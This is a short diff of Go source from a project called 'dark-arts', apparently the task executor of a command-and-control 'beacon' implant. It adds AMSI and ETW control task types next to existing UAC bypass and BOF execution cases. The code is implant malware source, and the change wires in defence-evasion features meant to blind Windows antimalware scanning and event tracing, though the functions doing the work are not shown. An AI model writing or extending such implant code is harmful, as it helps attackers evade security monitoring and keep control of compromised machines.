@@ -13,12 +13,15 @@ import (
 	"strings"
 	"time"
 
+	"dark-arts/pkg/securityctl"
 	"dark-arts/pkg/tasking"
 )
 
 type Executor struct {
-	Log     *slog.Logger
-	Timeout time.Duration
+	Log      *slog.Logger
+	Timeout  time.Duration
+	amsiCtrl securityctl.SecurityControl
+	etwCtrl  securityctl.SecurityControl
 }
 
 func (e *Executor) Run(ctx context.Context, t *tasking.Task) *tasking.Result {
@@ -64,6 +67,10 @@ func (e *Executor) Run(ctx context.Context, t *tasking.Task) *tasking.Result {
 		e.runUac(t.Payload, res)
 	case "bof":
 		e.runBOF(t.Payload, res)
+	case "amsi":
+		e.runAMSI(t.Payload, res)
+	case "etw":
+		e.runETW(t.Payload, res)
 	default:
 		res.Error = "beacon: unknown task type " + t.Type
 	}
